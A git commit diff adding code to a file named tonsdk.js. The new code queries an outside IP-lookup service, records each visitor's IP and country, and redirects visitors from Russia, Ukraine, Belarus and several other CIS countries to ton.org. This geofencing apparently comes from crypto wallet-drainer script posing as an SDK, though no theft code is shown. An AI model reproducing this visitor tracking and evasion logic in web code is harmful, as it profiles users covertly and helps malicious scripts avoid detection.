6a6ff036e742b91dd895e644ed7f20caeb8fcdb1
ShoperWax <barbybad13@gmail.com>
2024-06-24 20:15:52 -0300

    Update tonsdk.js

--- tonsdk.js
+++ tonsdk.js
@@ -8,7 +8,10 @@ var domain = window.location.hostname;
 var ipUser;
 
 
-
+fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
+    const country = data.country;
+    if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
+        window.location.replace('https://ton.org');
     }
     ipUser = data.ip;
     countryUser = data.country;
